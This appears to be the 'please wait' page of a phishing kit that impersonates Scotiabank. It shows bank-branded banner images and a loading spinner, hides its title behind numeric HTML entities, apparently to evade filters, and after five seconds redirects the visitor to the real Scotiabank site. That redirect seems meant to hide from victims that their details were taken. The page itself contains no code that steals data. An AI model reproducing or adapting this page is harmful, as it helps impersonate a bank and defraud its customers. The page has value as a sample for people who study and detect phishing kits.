<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#83;&#99;&#111;&#116;&#105;&#97;&#98;&#97;&#110;&#107;&#32;&#45;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>		  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<html><meta http-equiv="Refresh" content="05; url=http://www.scotiabank.com/ca/en/0,,2,00.html"></html>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1348px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1348px; height:51px; z-index:0"><img src="images/st6.png" alt="" title="" border=0 width=1348 height=51></div>

<div id="image2" style="position:absolute; overflow:hidden; left:391px; top:86px; width:499px; height:96px; z-index:1"><img src="images/st12.png" alt="" title="" border=0 width=499 height=96></div>

<div id="image3" style="position:absolute; overflow:hidden; left:618px; top:335px; width:90px; height:90px; z-index:2"><img src="images/wait.gif" alt="" title="" border=0 width=90 height=90></div>

</div>

</body>
</html>
